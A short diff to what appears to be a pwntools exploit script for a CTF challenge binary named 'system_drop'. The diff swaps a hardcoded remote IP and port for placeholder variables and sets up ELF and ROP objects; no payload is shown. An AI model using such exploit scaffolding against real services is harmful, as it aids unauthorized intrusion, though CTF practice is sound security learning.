@@ -1,6 +1,6 @@
 from pwn import *
 
-conn = remote('165.227.232.115', 32363)
+conn = remote(MACHINE_IP, MACHINE_PORT)
 
 elf = ELF("system_drop")
 elf_rop = ROP(elf)
